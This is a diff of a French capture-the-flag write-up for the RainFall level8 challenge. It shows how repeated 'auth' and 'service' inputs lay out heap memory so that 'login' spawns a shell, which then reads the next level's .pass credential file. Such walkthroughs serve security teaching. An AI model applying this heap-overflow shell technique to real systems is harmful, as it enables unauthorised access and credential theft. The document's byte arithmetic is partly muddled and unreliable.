@@ -13,20 +13,38 @@ Si on rentre "service", le programme fera un strdup(acStack_89) et la variabe 's
 
 Si on rentre "login", le programme affichera "Password:" sur stdin si auth[8] == 0 sinon il lancera un shell. C'est evidemment ce qui nous interesse.
 
+Quand on rentre la comamnde "auth ", le prompt nous redonne l'adresse alloue de la variable 'auth' :
 
-level8@RainFall:~$ ./level8 
-(nil), (nil) 
-auth 
-0x804a008, (nil) 
-service
-0x804a008, 0x804a018 
-service
-0x804a008, 0x804a028 
-login
-$ cd user9
-/bin/sh: 1: cd: can't cd to user9
-$ pwd
-/home/user/level8
-$ cd /home/user/level9
-$ cat .pass
+	level8@RainFall:~$ ./level8 
+	(nil), (nil) 
+	auth 
+	0x804a008, (nil)
 
+Si on rentre la commande 'service', le prompt nous redonne l'adresse alloue de la variable 'service' :
+
+	[...]
+	service
+	0x804a008, 0x804a018
+
+On s'apercoit que l'adresse retournee est superieur de 32 octets par rapport a celle de 'auth'.
+Cela veut dire que auth a fait un malloc de 4 pour un type int soit 4 * 4 = 32 octets
+Theoriquement auth[0-3] peut acceder a la memoire qu'il lui a ete alloue, mais sachant que l'adresse de service est contigu a celle de auth, auth peut acceder a l'emplacement memoire de service en faisant auth [4-7].
+
+Si on refait service on obtient :
+
+	[...]
+	service
+	0x804a008, 0x804a028 
+
+L'adresse de service est maintenant une adresse superieur de 32 octets par rapport a la precedente.
+Donc auth, peut acceder maintenant a la memoire auth[8-11].
+
+Etant donnee que auth[8] doit etre different de 0 pour ouvrir le shell, on rentre "login" et le shell s'execute :
+
+	login
+	$ cd user9
+	/bin/sh: 1: cd: can't cd to user9
+	$ pwd
+	/home/user/level8
+	$ cd /home/user/level9
+	$ cat .pass
